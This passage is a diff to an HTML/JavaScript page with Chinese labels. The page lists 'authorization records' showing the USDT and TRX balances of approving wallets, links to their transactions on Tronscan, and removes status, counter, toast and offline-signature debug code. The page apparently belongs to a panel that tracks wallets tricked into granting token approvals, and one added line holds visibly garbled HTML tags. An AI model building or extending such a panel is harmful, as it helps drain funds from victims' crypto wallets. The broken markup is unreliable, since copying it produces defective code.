+                        <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
+                        <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
                         <p><strong>时间：</strong>${record.approveTime}</p>
-                        <p><strong>状态：</strong><span style="color: ${record.status.includes('成功') ? '#4ade80' : record.status.includes('待') ? '#f97316' : '#ef4444'}">${record.status}</span></p>
+                        ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link"><<<i class="fa fa-external-link"></</</i> 查看交易</a></p>` : ""}
                     </div>
                 `).join("");
             } catch (e) {
                 console.log("渲染授权记录失败：", e);
             }
         }
-        function updateRecordCount() {
-            try {
-                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                document.getElementById("recordCount").textContent = `${records.length}条`;
-            } catch (e) {
-                console.log("更新记录计数失败：", e);
-            }
-        }
-        function showToast(msg, type = "success") {
-            const toast = document.getElementById("resultToast");
-            toast.textContent = msg;
-            toast.style.display = "block";
-            toast.style.borderColor = type === "success" ? "#3b82f6" : "#ef4444";
-            toast.style.color = type === "success" ? "#e0e8e4" : "#fca5a5";
-            setTimeout(() => {
-                toast.style.display = "none";
-            }, 3000);
-        }
-        document.getElementById("showDebugBtn").addEventListener("click", () => {
-            const debugKeys = Object.keys(localStorage).filter(key => key.startsWith("signature_debug_"));
-            if (debugKeys.length === 0) {
-                alert("未找到调试信息，请先点击「生成离线签名」触发错误");
-                return;
-            }
-            const debugInfo = JSON.parse(localStorage.getItem(debugKeys[0]));
-            alert("调试信息：\n" + JSON.stringify(debugInfo, null, 2));
-        });
     </script>
 </body>
 </html>
